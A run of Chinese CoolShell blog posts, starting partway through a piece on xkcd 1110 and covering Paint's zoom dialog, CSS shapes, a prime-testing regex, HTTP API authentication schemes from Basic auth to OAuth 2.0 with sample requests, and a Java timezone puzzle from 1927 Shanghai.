**几乎整个互联网都沸腾了，但好像中国社区对此事完全不知。**网上出现了很多相关的blog和站点来分析这个图片。如果你在Google里搜xkcd 1110，你会发现很多内容。#### 这个图有多大* 这个图可以分解成 2592 个 2048 x 2048 像素的图。* 但其中只有 225 个 2048 x 2048 的PNG 图片文件。而剩下的2337 基本上是纯黑的或是纯白的块。比如地下和天空。* 整个图横向有81个2048 x 2048的图（左边有33个，右边有48个），纵向有32个 2048 x 2048个图（天上有13个，地下有19个）* 老大当晚Release的全尺寸的大图（比现在你看到的还要大），不算空白处，图片共有60G的像素，而如果要算上整个图将会是T级别的像素。现在你看到版本已被做过优化，不算空白处，只有1G的像素，而算上全图有10G的像素。 (2048x2048x225 = 943,718,400 和 2048x2048x2592 = 10,871,635,968).* 如果我们按比例来看的话，图中的32个象素对应于现实世界的5英尺，那么，这个图的宽有25920英尺（7.9公里），高有10240英尺（3.1公里）。
* 如果每个 2048 x 2048 的PNG图可以被打印成一个300 dpi的宣传画，那么，这个宣传画基本上是14.05米宽，5.55米高的图。现在的PNG被调整过了，只有72dpi左右。有人说，创作这么这个大图很费时间。不过我觉得这对于Geek来说不是问题，因为这应该是可以通过矢量图的拼装来搞定。!xkcd 1110全景缩略图（点击看大缩略图）xkcd 1110全景缩略图（点击看大缩略图）#### 看看技术宅们干了什么下面我只记录了些不完全的技术宅们的因为这个画搞出来的东西。大家可以补充。1）如果你用鼠标翻得不爽的话，你可以看看这篇文章，在你的Chrome下按Ctrl+Shift+I，然后到Javascript控制台里，粘贴文中的代码，于是，你就可以用键盘的光标键移动并浏览整个世界了。2）这是个全屏版的：http://ares.aylett.co.uk/xkcd/3）如果你要下载所有的图，你可以使用这个Python脚本来完成（转自这篇文章）4）还有人把它搞成了像Google Map一样的东西。 你可以访问下面的链接：>   *  >   * http://xkcdmap.webege.com/  >
> > 5）看看Hacker News的讨论贴吧，什么都有了（）当然，对于这个图最强的一个站点如下，解释了所有和这个图有关信息，包括图中的各种文字和图案的意思。看到这个图后，我陷入了深深地沉思，我在想。是什么样的动力能让人干出这样的事来？兴趣，还是为了好玩。还就是为了证明他能干一些让人拍案叫绝的东西？ **这可能就是一种Geek精神吧。就是为了能做出让世人冿冿乐道的东西** 。（全文完）# 微软最囧的UI作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn以前，本站介绍过一些Ugly的UI，今天我们来看看微软Windows里的“画笔”程序，看看微软的某个功能干了什么样的囧事。我打开了一个比较大的图片，有点太大了，我想缩小一下看看，很好，微软在菜单项里供了Zoom选项，其中有一个Custom（自定义），挺不错的。但是，当我看到这个自定义的对话框后，我彻底无语了，大哥你是怎么想的啊……# CSS图形作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn下面的示例展示了使用纯CSS制作的各种图形，你可以自由地修改文中的CSS代码。这个收集的原文在这里。
经测试，IE9, Chrome, FF, Safari都可以正常显示。目录* 正方形   * 长方形   * 圆形   * 椭圆形   * 三角形（向上）   * 三角形（向下）   * 三角形（向左）   * 三角形（向右）   * 三角形（左上）   * 三角形（右上）   * 三角形（左下）   * 三角形（右下）   * 平行四边行   * 梯形   * 六角星形   * 五角星形 via Kit MacAllister   * 五边形   * 六边形   * 八边形   * 心形 via Nicolas Gallagher   * 无穷大 via Nicolas Gallagher   * 菱形   * 鸡蛋   * 吃豆人   * 说话泡泡   * 12星形 via Alan Johnson   * 8星形 via Alan Johnson##### 正方形##### 长方形##### 圆形##### 椭圆形##### 三角形（向上）##### 三角形（向下）##### 三角形（向左）##### 三角形（向右）##### 三角形（左上）##### 三角形（右上）##### 三角形（左下）
##### 三角形（右下）##### 平行四边行##### 梯形##### 六角星形##### 五角星形 via Kit MacAllister##### 五边形##### 六边形##### 八边形##### 心形 via Nicolas Gallagher##### 无穷大 via Nicolas Gallagher##### 菱形##### 鸡蛋##### 吃豆人##### 说话泡泡##### 12星形 via Alan Johnson##### 8星形 via Alan Johnson(全文完)# 检查素数的正则表达式作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn一般来说，我们会使用正规表达式来做字符串匹配，今天在网上浏览的时候，看到了有人用正则表达式来检查一个数字是否为素数（质数），让我非常感兴趣，这个正则表达式如入所示：检查素数与否的正则表达式要使用这个正规则表达式，你需要把自然数转成多个1的字符串，如：2 要写成 “11”， 3 要写成 “111”, 17 要写成“11111111111111111”，这种工作使用一些脚本语言可以轻松的完成。
一开始我对这个表达式持怀疑态度，但仔细研究了一下这个表达式，发现是非常合理的，下面，让我带你来细细剖析一下是这个表达式的工作原理。首先，我们看到这个表达式中有“|”，也就是说这个表达式可以分成两个部分：/^1?$/ 和 /^(11+?)\1+$/* **第一部分：/^1?$/** ， 这个部分相信不用我多说了，其表示匹配“空串”以及字串中只有一个“1”的字符串。   * **第二部分：/^(11+?)\1+$/** ，这个部分是整个表达式的关键部分。其可以分成两个部分， **(11+?)** 和 **\1+$** ，前半部很简单了，匹配以“11”开头的并重复0或n个1的字符串，后面的部分意思是把前半部分作为一个字串去匹配还剩下的字符串1次或多次（这句话的意思是——剩余的字串的1的个数要是前面字串1个数的整数倍）。可见这个正规则表达式是取非素数，要得到素数还得要对整个表达式求反。通过上面的分析，我们知道，第二部分是最重要的，对于第二部分，举几个例子，**示例一：判断自然数8** 。我们可以知道，8转成我们的格式就是“11111111”，对于 **(11+?)** ，其匹配了“11”，于是还剩下“111111”，而 **\1+$** 正好匹配了剩下的“111111”，因为，“11”这个模式在“111111”出现了三次，符合模式匹配，返回true。所以，匹配成功，于是这个数不是质数。
**示例二：判断自然数11** 。转成我们需要的格式是“11111111111”（十一个1），对于 **(11+?)** ，其匹配了“11”（前两个1），还剩下“111111111”（九个1），而 **\1+$** 无法为“11”匹配那“九个1”，因为“11”这个模式并没有在“九个1”这个串中正好出现N次。于是，我们的正则表达式引擎会尝试下一种方法，先匹配“111”（前三个1），然后把“111”作为模式去匹配剩下的“11111111”（八个1），很明显，那“八个1”并没有匹配“三个1”多次。所以，引擎会继续向下尝试……直至尝试所有可能都无法匹配成功。所以11是素数。通过示例二，我们可以得到这样的等价数算算法，正则表达式会匹配这若干个1中有没有出现“二个1”的整数倍，“三个1”的整数倍，“四个1”的整数倍……，而，这正好是我们需要的算素数的算法。现在大家明白了吧。下面，我们用perl来使用这个正规则表达式不停地输出素数：（关于perl的语法我就不多说了，请注意表达式前的取反操作符）[perl]perl -e’$|++;(1 x$_)!~/^1?$|^(11+?)\1+$/&&print"$_ "while ++$_'[/perl]
另外，让我们来举一反三，根据上述的这种方法，我们甚至可以用正则表达式来求证某方式是否有解，如：* **二元方程** ：17x + 12y = 51 判断其是否有解的正则表达式是： **^** **(** **.*** **)** **\1{16}** **(** **.*** **)** **\2{11}$**   * **三元方程** ：11x + 2y + 5z = 115 判断其是否有解的正则表达式是： **^** **(** **.*** **)** **\1{10}** **(** **.*** **)** **\2{1}** **(** **.*** **)** **\3{4}$**大家不妨自己做做练习，为什么上述的两个正则表达式可以判断方程是否有解。如果无法参透其中的奥妙的话，你可以读读这篇英文文章。（全文完）# HTTP API 认证授权术作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn我们知道，HTTP是无状态的，所以，当我们需要获得用户是否在登录的状态时，我们需要检查用户的登录状态，一般来说，用户的登录成功后，服务器会发一个登录凭证（又被叫作Token），就像你去访问某个公司，在前台被认证过合法后，这个公司的前台会给你的一个访客卡一样，之后，你在这个公司内去到哪都用这个访客卡来开门，而不再校验你是哪一个人。在计算机的世界里，这个登录凭证的相关数据会放在两种地方，一个地方在用户端，以Cookie的方式（一般不会放在浏览器的Local Storage，因为这很容易出现登录凭证被XSS攻击），另一个地方是放在服务器端，又叫Session的方式（SessonID存于Cookie）。
但是，这个世界还是比较复杂的，除了用户访问，还有用户委托的第三方的应用，还有企业和企业间的调用，这里，我想把业内常用的一些 API认证技术相对系统地总结归纳一下，这样可以让大家更为全面的了解这些技术。 **注意，这是一篇长文！**本篇文章会覆盖如下技术：* HTTP Basic   * Digest Access   * App Secret Key + HMAC   * JWT – JSON Web Tokens   * OAuth 1.0 – 3 legged & 2 legged   * OAuth 2.0 – Authentication Code & Client Credential目录* HTTP Basic   * Digest Access   * App Secret Key + HMAC   * JWT – JSON Web Tokens   * OAuth 1.0   * OAuth 2.0     * Authorization Code Flow     * Client Credential Flow   * 小结     * 两个术语和三个概念     * 明白一些初衷     * 相关的注意事项
#### HTTP BasicHTTP Basic 是一个非常传统的API认证技术，也是一个比较简单的技术。这个技术也就是使用 `username`和 `password` 来进行登录。整个过程被定义在了 RFC 2617 中，也被描述在了 Wikipedia: Basic Access Authentication 词条中，同时也可以参看 MDN HTTP Authentication其技术原理如下：1. 把 `username`和 `password` 做成 `username:password` 的样子（用冒号分隔）   2. 进行Base64编码。`Base64("username:password")` 得到一个字符串（如：把 `haoel:coolshell` 进行base64 后可以得到 `aGFvZW86Y29vbHNoZWxsCg` ）   3. 把 `aGFvZW86Y29vbHNoZWxsCg`放到HTTP头中 `Authorization` 字段中，形成 `Authorization: Basic aGFvZW86Y29vbHNoZWxsCg`，然后发送到服务端。   4. 服务端如果没有在头里看到认证字段，则返回401错，以及一个个````WWW-Authenticate`: Basic Realm='HelloWorld'` 之类的头要求客户端进行认证。之后如果没有认证通过，则返回一个401错。如果服务端认证通过，那么会返回200。
我们可以看到，使用Base64的目的无非就是为了把一些特殊的字符给搞掉，这样就可以放在HTTP协议里传输了。而这种方式的问题最大的问题就是把用户名和口令放在网络上传，所以，一般要配合TLS/SSL的安全加密方式来使用。我们可以看到 JIRA Cloud 的API认证支持HTTP Basic 这样的方式。但我们还是要知道，这种把用户名和密码同时放在公网上传输的方式有点不太好，因为Base64不是加密协议，而是编码协议，所以就算是有HTTPS作为安全保护，给人的感觉还是不放心。#### Digest Access中文称“HTTP 摘要认证”，最初被定义在了 RFC 2069 文档中（后来被 RFC 2617 引入了一系列安全增强的选项；“保护质量”(qop)、随机数计数器由客户端增加、以及客户生成的随机数）。其基本思路是，请求方把用户名口令和域做一个MD5 – `MD5(username:realm:password)` 然后传给服务器，这样就不会在网上传用户名和口令了，但是，因为用户名和口令基本不会变，所以，这个MD5的字符串也是比较固定的，因此，这个认证过程在其中加入了两个事，一个是 `nonce` 另一个是 `qop`
* 首先，调用方发起一个普通的HTTP请求。比如：`GET /coolshell/admin/ HTTP/1.1`   * 服务端自然不能认证能过，服务端返回401错误，并且在HTTP头里的 `WWW-Authenticate` 包含如下信息：WWW-Authenticate: Digest realm="[[email protected]](/cdn-cgi/l/email-protection)",     qop="auth,auth-int",     nonce="dcd98b7102dd2f0e8b11d0f600bfb0c093",     opaque="5ccc069c403ebaf9f0171e9517f40e41"* 其中的 `nonce` 为服务器端生成的随机数，然后，客户端做 `HASH1=MD5(MD5(username:realm:password):nonce:cnonce)` ，其中的 `cnonce` 为客户端生成的随机数，这样就可以使得整个MD5的结果是不一样的。   * 如果 `qop` 中包含了 `auth` ，那么还得做 `HASH2=MD5(method:digestURI)` 其中的 `method` 就是HTTP的请求方法（GET/POST…），`digestURI` 是请求的URL。   * 如果 `qop` 中包含了 `auth-init` ，那么，得做 `HASH2=MD5(method:digestURI:MD5(entityBody))` 其中的 `entityBody` 就是HTTP请求的整个数据体。   * 然后，得到 `response = MD5(HASH1:nonce:nonceCount:cnonce:qop:HASH2)` 如果没有 `qop`则 `response = MD5(HA1:nonce:HA2)`   * 最后，我们的客户端对服务端发起如下请求—— 注意HTTP头的 `Authorization: Digest ...`
GET /dir/index.html HTTP/1.0     Host: localhost     Authorization: Digest username="Mufasa",     realm="[[email protected]](/cdn-cgi/l/email-protection)",     nonce="dcd98b7102dd2f0e8b11d0f600bfb0c093",     uri="%2Fcoolshell%2Fadmin",     qop=auth,     nc=00000001,     cnonce="0a4f113b",     response="6629fae49393a05397450978507c4ef1",     opaque="5ccc069c403ebaf9f0171e9517f40e41"维基百科上的 Wikipedia: Digest access authentication 词条非常详细地描述了这个细节。摘要认证这个方式会比之前的方式要好一些，因为没有在网上传递用户的密码，而只是把密码的MD5传送过去，相对会比较安全，而且，其并不需要是否TLS/SSL的安全链接。但是， **别看这个算法这么复杂，最后你可以发现，整个过程其实关键是用户的password，这个password如果不够得杂，其实是可以被暴力破解的，而且，整个过程是非常容易受到中间人攻击** ——比如一个中间人告诉客户端需要的 Basic 的认证方式 或是 老旧签名认证方式（RFC2069）。
#### App Secret Key + HMAC先说HMAC技术，这个东西来自于MAC – Message Authentication Code，是一种用于给消息签名的技术，也就是说，我们怕消息在传递的过程中被人修改，所以，我们需要用对消息进行一个MAC算法，得到一个摘要字串，然后，接收方得到消息后，进行同样的计算，然后比较这个MAC字符串，如果一致，则表明没有被修改过（整个过程参看下图）。而HMAC – Hash-based Authenticsation Code，指的是利用Hash技术完成这一工作，比如：SHA-256算法。（图片来自 Wikipedia – MAC 词条 ）我们再来说App ID，这个东西跟验证没有关系，只是用来区分，是谁来调用API的，就像我们每个人的身份证一样，只是用来标注不同的人，不是用来做身份认证的。与前面的不同之处是，这里，我们需要用App ID 来映射一个用于加密的密钥，这样一来，我们就可以在服务器端进行相关的管理，我们可以生成若干个密钥对（AppID, AppSecret），并可以有更细粒度的操作权限管理。把AppID和HMAC用于API认证，目前来说，玩得最好最专业的应该是AWS了，我们可以通过S3的API请求签名文档看到AWS是怎么玩的。整个过程还是非常复杂的，可以通过下面的图片流程看个大概。基本上来说，分成如下几个步骤：
1. 把HTTP的请求（方法、URI、查询字串、头、签名头，body）打个包叫 `CanonicalRequest`，作个SHA-256的签名，然后再做一个base16的编码   2. 把上面的这个签名和签名算法 `AWS4-HMAC-SHA256`、时间戳、Scop，再打一个包，叫 `StringToSign`。   3. 准备签名，用 `AWSSecretAccessKey`来对日期签一个 `DataKey`，再用 `DataKey` 对要操作的Region签一个 `DataRegionKey` ，再对相关的服务签一个`DataRegionServiceKey` ，最后得到 `SigningKey`.   4. 用第三步的 `SigningKey`来对第二步的 `StringToSign` 签名。最后，发出HTTP Request时，在HTTP头的 `Authorization`字段中放入如下的信息：Authorization: AWS4-HMAC-SHA256     Credential=AKIDEXAMPLE/20150830/us-east-1/iam/aws4_request,     SignedHeaders=content-type;host;x-amz-date,     Signature=5d672d79c15b13162d9279b0855cfba6789a8edb4c82c400e06b5924a6f2b5d7
其中的 `AKIDEXAMPLE` 是 AWS Access Key ID， 也就是所谓的 AppID，服务器端会根据这个AppID来查相关的 Secret Access Key，然后再验证签名。如果，你对这个过程有点没看懂的话，你可以读一读这篇文章——《Amazon S3 Rest API with curl》这篇文章里有好些代码，代码应该是最有细节也是最准确的了。这种认证的方式好处在于，AppID和AppSecretKey，是由服务器的系统开出的，所以，是可以被管理的，AWS的IAM就是相关的管理，其管理了用户、权限和其对应的AppID和AppSecretKey。但是不好的地方在于，这个东西没有标准 ，所以，各家的实现很不一致。比如： Acquia 的 HMAC，微信的签名算法 （这里，我们需要说明一下，微信的API没有遵循HTTP协议的标准，把认证信息放在HTTP 头的 `Authorization` 里，而是放在body里）#### JWT – JSON Web TokensJWT是一个比较标准的认证解决方案，这个技术在Java圈里应该用的是非常普遍的。JWT签名也是一种MAC（Message Authentication Code）的方法。JWT的签名流程一般是下面这个样子：
1. 用户使用用户名和口令到认证服务器上请求认证。   2. 认证服务器验证用户名和口令后，以服务器端生成JWT Token，这个token的生成过程如下：      * 认证服务器还会生成一个 Secret Key（密钥）     * 对JWT Header和 JWT Payload分别求Base64。在Payload可能包括了用户的抽象ID和的过期时间。     * 用密钥对JWT签名 `HMAC-SHA256(SecertKey, Base64UrlEncode(JWT-Header)+'.'+Base64UrlEncode(JWT-Payload));`   3. 然后把 `base64(header).base64(payload).signature` 作为 JWT token返回客户端。   4. 客户端使用JWT Token向应用服务器发送相关的请求。这个JWT Token就像一个临时用户权证一样。当应用服务器收到请求后：1. 应用服务会检查 JWT Token，确认签名是正确的。   2. 然而，因为只有认证服务器有这个用户的Secret Key（密钥），所以，应用服务器得把JWT Token传给认证服务器。   3. 认证服务器通过JWT Payload 解出用户的抽象ID，然后通过抽象ID查到登录时生成的Secret Key，然后再来检查一下签名。   4. 认证服务器检查通过后，应用服务就可以认为这是合法请求了。
我们可以看以，上面的这个过程，是在认证服务器上为用户动态生成 Secret Key的，应用服务在验签的时候，需要到认证服务器上去签，这个过程增加了一些网络调用，所以，JWT除了支持HMAC- SHA256的算法外，还支持RSA的非对称加密的算法。使用RSA非对称算法，在认证服务器这边放一个私钥，在应用服务器那边放一个公钥，认证服务器使用私钥加密，应用服务器使用公钥解密，这样一来，就不需要应用服务器向认证服务器请求了，但是，RSA是一个很慢的算法，所以，虽然你省了网络调用，但是却费了CPU，尤其是Header和Payload比较长的时候。所以，一种比较好的玩法是，如果我们把header 和 payload简单地做SHA256，这会很快，然后，我们用RSA加密这个SHA256出来的字符串，这样一来，RSA算法就比较快了，而我们也做到了使用RSA签名的目的。最后，我们只需要使用一个机制在认证服务器和应用服务器之间定期地换一下公钥私钥对就好了。这里强烈建议全文阅读 Anglar 大学的 《JSW：The Complete Guide to JSON Web Tokens》#### OAuth 1.0
OAuth也是一个API认证的协议，这个协议最初在2006年由Twitter的工程师在开发OpenID实现的时候和社交书签网站Ma.gnolia时发现，没有一种好的委托授权协议，后来在2007年成立了一个OAuth小组，知道这个消息后，Google员工也加入进来，并完善有善了这个协议，在2007年底发布草案，过一年后，在2008年将OAuth放进了IETF作进一步的标准化工作，最后在2010年4月，正式发布OAuth 1.0，即：RFC 5849 （这个RFC比起TCP的那些来说读起来还是很轻松的），不过，如果你想了解其前身的草案，可以读一下 OAuth Core 1.0 Revision A ，我在下面做个大概的描述。根据RFC 5849，可以看到 OAuth 的出现，目的是为了，用户为了想使用一个第三方的网络打印服务来打印他在某网站上的照片，但是，用户不想把自己的用户名和口令交给那个第三方的网络打印服务，但又想让那个第三方的网络打印服务来访问自己的照片，为了解决这个授权的问题，OAuth这个协议就出来了。* 这个协议有三个角色：      * **User（照片所有者-用户）**     * **Consumer（第三方照片打印服务）**     * **Service Provider（照片存储服务）**   * 这个协义有三个阶段：      * **Consumer获取Request Token**     * **Service Provider 认证用户并授权Consumer**     * **Consumer获取Access Token调用API访问用户的照片**
整个授权过程是这样的：1. Consumer（第三方照片打印服务）需要先上Service Provider获得开发的 Consumer Key 和 Consumer Secret   2. 当 User 访问 Consumer 时，Consumer 向 Service Provide 发起请求请求Request Token （需要对HTTP请求签名）   3. Service Provide 验明 Consumer 是注册过的第三方服务商后，返回 Request Token（`oauth_token`）和 Request Token Secret （`oauth_token_secret`）   4. Consumer 收到 Request Token 后，使用HTTP GET 请求把 User 切到 Service Provide 的认证页上（其中带上Request Token），让用户输入他的用户和口令。   5. Service Provider 认证 User 成功后，跳回 Consumer，并返回 Request Token （`oauth_token`）和 Verification Code（`oauth_verifier`）   6. 接下来就是签名请求，用Request Token 和 Verification Code 换取 Access Token （`oauth_token`）和 Access Token Secret (`oauth_token_secret`)   7. 最后使用Access Token 访问用户授权访问的资源。
下图附上一个Yahoo!的流程图可以看到整个过程的相关细节。因为上面这个流程有三方：User，Consumer 和 Service Provide，所以，又叫 3-legged flow，三脚流程。OAuth 1.0 也有不需要用户参与的，只有Consumer 和 Service Provider 的， 也就是 2-legged flow 两脚流程，其中省掉了用户认证的事。整个过程如下所示：1. Consumer（第三方照片打印服务）需要先上Service Provider获得开发的 Consumer Key 和 Consumer Secret   2. Consumer 向 Service Provide 发起请求请求Request Token （需要对HTTP请求签名）   3. Service Provide 验明 Consumer 是注册过的第三方服务商后，返回 Request Token（`oauth_token`）和 Request Token Secret （`oauth_token_secret`）   4. Consumer 收到 Request Token 后，直接换取 Access Token （`oauth_token`）和 Access Token Secret (`oauth_token_secret`)   5. 最后使用Access Token 访问用户授权访问的资源。
最后，再来说一说OAuth中的签名。* 我们可以看到，有两个密钥，一个是Consumer注册Service Provider时由Provider颁发的 Consumer Secret，另一个是 Token Secret。   * 签名密钥就是由这两具密钥拼接而成的，其中用 `&`作连接符。假设 Consumer Secret 为 `j49sk3j29djd` 而 Token Secret 为`dh893hdasih9`那个，签名密钥为：`j49sk3j29djd&dh893hdasih9`   * 在请求Request/Access Token的时候需要对整个HTTP请求进行签名（使用HMAC-SHA1和HMAC-RSA1签名算法），请求头中需要包括一些OAuth需要的字段，如：      * **Consumer Key** ： 也就是所谓的AppID     * **Token** ： Request Token 或 Access Token     * **Signature Method** ：签名算法比如：HMAC-SHA1     * **Timestamp** ：过期时间     * **Nonce** ：随机字符串     * **Call Back** ：回调URL
下图是整个签名的示意图：图片还是比较直观的，我就不多解释了。#### OAuth 2.0在前面，我们可以看到，从Digest Access， 到AppID+HMAC，再到JWT，再到OAuth 1.0，这些个API认证都是要向Client发一个密钥（或是用密码）然后用HASH或是RSA来签HTTP的请求， **这其中有个主要的原因是，以前的HTTP是明文传输，所以，在传输过程中很容易被篡改，于是才搞出来一套的安全签名机制** ，所以，这些个认证的玩法是可以在HTTP明文协议下玩的。这种使用签名方式大家可以看到是比较复杂的，所以，对于开发者来说，也是很不友好的，在组织签名的那些HTTP报文的时候，各种，URLEncode和Base64，还要对Query的参数进行排序，然后有的方法还要层层签名，非常容易出错，另外，这种认证的安全粒度比较粗，授权也比较单一，对于有终端用户参与的移动端来说也有点不够。所以，在2012年的时候，OAuth 2.0 的 RFC 6749 正式放出。**OAuth 2.0依赖于TLS/SSL的链路加密技术（HTTPS），完全放弃了签名的方式，认证服务器再也不返回什么 token secret 的密钥了，所以，OAuth 2.0是完全不同于1.0 的，也是不兼容的** 。目前，Facebook 的 Graph API 只支持OAuth 2.0协议，Google 和 Microsoft Azure 也支持Auth 2.0，国内的微信和支付宝也支持使用OAuth 2.0。
下面，我们来重点看一下OAuth 2.0的两个主要的Flow：* 一个是Authorization Code Flow， 这个是 3 legged 的   * 一个是Client Credential Flow，这个是 2 legged 的。##### **Authorization Code Flow**Authorization Code 是最常使用的OAuth 2.0的授权许可类型，它适用于用户给第三方应用授权访问自己信息的场景。这个Flow也是OAuth 2.0四个Flow中我个人觉得最完整的一个Flow，其流程图如下所示。下面是对这个流程的一个细节上的解释：1）当用户（Resource Owner）访问第三方应用（Client）的时候，第三方应用会把用户带到认证服务器（Authorization Server）上去，主要请求的是 `/authorize` API，其中的请求方式如下所示。https://login.authorization-server.com/authorize?     client_id=6731de76-14a6-49ae-97bc-6eba6914391e     &response_type=code     &redirect_uri=http%3A%2F%2Fexample-client.com%2Fcallback%2F     &scope=read     &state=xcoiv98CoolShell3kch
其中：*     * `client_id`为第三方应用的App ID     * `response_type=code`为告诉认证服务器，我要走Authorization Code Flow。     * `redirect_uri`意思是我跳转回第三方应用的URL     * `scope`意是相关的权限     * `state` 是一个随机的字符串，主要用于防CSRF攻击。2）当Authorization Server收到这个URL请求后，其会通过 `client_id`来检查 `redirect_uri`和 `scope`是否合法，如果合法，则弹出一个页面，让用户授权（如果用户没有登录，则先让用户登录，登录完成后，出现授权访问页面）。3）当用户授权同意访问以后，Authorization Server 会跳转回 Client ，并以其中加入一个 Authorization Code。 如下所示：https://example-client.com/callback?     code=Yzk5ZDczMzRlNDEwYlrEqdFSBzjqfTG     &state=xcoiv98CoolShell3kch
我们可以看到，*     * 请流动的链接是第 1）步中的 `redirect_uri`     * 其中的 `state` 的值也和第 1）步的 `state`一样。4）接下来，Client 就可以使用 Authorization Code 获得 Access Token。其需要向 Authorization Server 发出如下请求。POST /oauth/token HTTP/1.1     Host: authorization-server.comcode=Yzk5ZDczMzRlNDEwYlrEqdFSBzjqfTG     &grant_type=code     &redirect_uri=https%3A%2F%2Fexample-client.com%2Fcallback%2F     &client_id=6731de76-14a6-49ae-97bc-6eba6914391e     &client_secret=JqQX2PNo9bpM0uEihUPzyrh5）如果没什么问题，Authorization 会返回如下信息。其中，*     * `access_token`就是访问请求令牌了     * `refresh_token`用于刷新 `access_token`     * `id_token` 是JWT的token，其中一般会包含用户的OpenID
6）接下来就是用 Access Token 请求用户的资源了。GET /v1/user/pictures     Host: https://example.resource.comAuthorization: Bearer iJKV1QiLCJhbGciOiJSUzI1NiI#####  Client Credential FlowClient Credential 是一个简化版的API认证，主要是用于认证服务器到服务器的调用，也就是没有用户参与的的认证流程。下面是相关的流程图。这个过程非常简单，本质上就是Client用自己的 `client_id`和 `client_secret`向Authorization Server 要一个 Access Token，然后使用Access Token访问相关的资源。请求示例POST /token HTTP/1.1     Host: server.example.com     Content-Type: application/x-www-form-urlencodedgrant_type=client_credentials     &client_id=czZCaGRSa3F0Mzpn     &client_secret=7Fjfp0ZBr1KtDRbnfVdmIw
返回示例这里，容我多扯一句，微信公从平台的开发文档中，使用了OAuth 2.0 的 Client Credentials的方式（参看文档“微信公众号获取access token”），我截了个图如下所谓。我们可以看到， **微信公众号使用的是GET方式的请求，把AppID和AppSecret放在了URL中，虽然这也符合OAuth 2.0，但是并不好，因为大多数网关代理会把整个URI请求记到日志中。我们只要脑补一下腾讯的网关的Access Log，里面的日志一定会有很多的各个用户的AppID和AppSecret……**#### 小结讲了这么多，我们来小结一下（下面的小结可能会有点散）##### 两个术语和三个概念* 区分两个术语：Authentication（认证） 和 Authorization （授权），前者是证明请求者是身份，就像身份证一样，后者是为了获得权限。身份是区别于别人的证明，而权限是证明自己的特权。Authentication为了证明操作的这个人就是他本人，需要提供密码、短信验证码，甚至人脸识别。Authorization 则是不需要在所有的请求都需要验人，是在经过Authorization后得到一个Token，这就是Authorization。就像护照和签证一样。   * 区分三个概念：编码Base64Encode、签名HMAC、加密RSA。Base64编码是为了更好的传输（没有怪异的字符，可以传输二进制文件），等同于明文，HMAC签名是为了信息不能被篡改，RSA加密是为了不让别人看到是什么信息。
##### 明白一些初衷* 使用复杂地HMAC哈希签名方式主要是应对当年没有TLS/SSL加密链路的情况。   * JWT把 `uid` 放在 Token中目的是为了去掉状态，但不能让用户修改，所以需要签名。   * OAuth 1.0区分了两个事，一个是第三方的Client，一个是真正的用户，其先拿Request Token，再换Access Token的方法主要是为了把第三方应用和用户区分开来。   * 用户的Password是用户自己设置的，复杂度不可控，服务端颁发的Serect会很复杂，但主要目的是为了容易管理，可以随时注销掉。   * OAuth 协议有比所有认证协议有更为灵活完善的配置，如果使用AppID/AppSecret签名的方式，又需要做到可以有不同的权限和可以随时注销，那么你得开发一个像AWS的IAM这样的账号和密钥对管理的系统。##### 相关的注意事项* 无论是哪种方式，我们都应该遵循HTTP的规范，把认证信息放在 `Authorization` HTTP 头中。   * 不要使用GET的方式在URL中放入secret之类的东西，因为很多proxy或gateway的软件会把整个URL记在Access Log文件中。   * 密钥Secret相当于Password，但他是用来加密的，最好不要在网络上传输，如果要传输，最好使用TLS/SSL的安全链路。   * HMAC中无论是MD5还是SHA1/SHA2，其计算都是非常快的，RSA的非对称加密是比较耗CPU的，尤其是要加密的字符串很长的时候。   * 最好不要在程序中hard code 你的 Secret，因为在github上有很多黑客的软件在监视各种Secret，千万小心！这类的东西应该放在你的配置系统或是部署系统中，在程序启动时设置在配置文件或是环境变量中。   * 使用AppID/AppSecret，还是使用OAuth1.0a，还是OAuth2.0，还是使用JWT，我个人建议使用TLS/SSL下的OAuth 2.0。   * 密钥是需要被管理的，管理就是可以新增可以撤销，可以设置账户和相关的权限。最好密钥是可以被自动更换的。   * 认证授权服务器（Authorization Server）和应用服务器（App Server）最好分开。
(全文完)# 你确信你了解时间吗？作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn你还记得“软件真的好难做”中的那个有意思的例子吗？那个例子告诉我们软件开发中假设可能会是致命的事。今天，我又在StackOverflow上看到一个关于时间的问题——为什么1927年12月31日的午夜时间这么奇怪？提问题的这个人给了下面的一段java代码（我做一些修改，保证让你可以copy过去就可以编译运行）我在其中高亮了几行，这个程序就是想比较一下“1927-12-31 23:54:07” 和 “1927-12-31 23:54:08” 差几秒，很明显，是差一秒。但是程序的输出却不是这样的。下面，让我们来看看程序的输出：（是的，差出353秒钟来）> `-1325491905   >  -1325491552   >  353`Stackoverflow真的很强大，在大家要求发问者给出时区（中国上海）的15分钟内就解决了这个问题。相当的令人惊叹。原因是什么呢？大家需要围观一下这个网页。（为了怕被墙或是被和谐，我已习惯了抓屏保存，如果有人能开发一个软件能随看随抓，然后如果源被删了可以P2P的从已下载了的人那里获取，那么这个软件应该会很有国内市场。蛋扯远了，Sorry）
从上图中我们可以看到—— 在1927年12月31日23:59:59时，往后面的一秒应该是1928年1月1日 0:0:0，但是这个时间被往后调整了5分52秒，而成了，1927年12月31日的，23:54:08，于是，完成了352秒的穿越。于是我们的Java程序出了这样的一个问题，这真是一个奇迹。为什么会有这个调整呢？我居然Google不到，不过，我在这个timeanddate.com上查看了一下北京的时间，发现北京的时间只到1970年，于是我猜想，中国近代历史乱七八糟的政权交替可能是这个原因。于是我看 了一下北京和上海物理时差，果然，北京上海的时差在5分50秒左右。 **因此，我觉得这个时间的变化应该是从上海（南京）时间变成了北京时间** 。至于你信不信，反正我是信了。从这个事，我得到下面的一些启示：1. Java在的时区实现相当的强大啊。这种细节都能考虑到。   2. 本地时间的完全就是一锅粥，应该尽量不用。   3. 如果你要开发和时区有关系的程序，你的系统里一定要使用GMT标准时间，仅在显示的时候才转成本地时间。各位无证程序员们，看到这个例子，你们是不是感到编程的压力了？呵呵。# Cuckoo Filter：设计与实现
